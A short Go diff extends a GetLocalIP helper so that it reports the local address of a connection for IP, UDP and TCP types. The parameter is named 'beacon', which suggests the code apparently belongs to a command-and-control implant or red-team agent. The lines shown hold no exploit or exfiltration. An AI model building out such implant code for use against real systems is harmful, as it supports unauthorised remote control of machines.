@@ -157,8 +157,14 @@ func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProt
 
 func GetLocalIP(beacon io.ReadWriteCloser) string {
 	if conn, ok := beacon.(interface{ LocalAddr() net.Addr }); ok {
-		if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok {
-			return tcpAddr.IP.String()
+		if addr, ok := conn.LocalAddr().(*net.IPAddr); ok {
+			return addr.IP.String()
+		}
+		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
+			return addr.IP.String()
+		}
+		if addr, ok := conn.LocalAddr().(*net.TCPAddr); ok {
+			return addr.IP.String()
 		}
 	}
 	return "unknown"
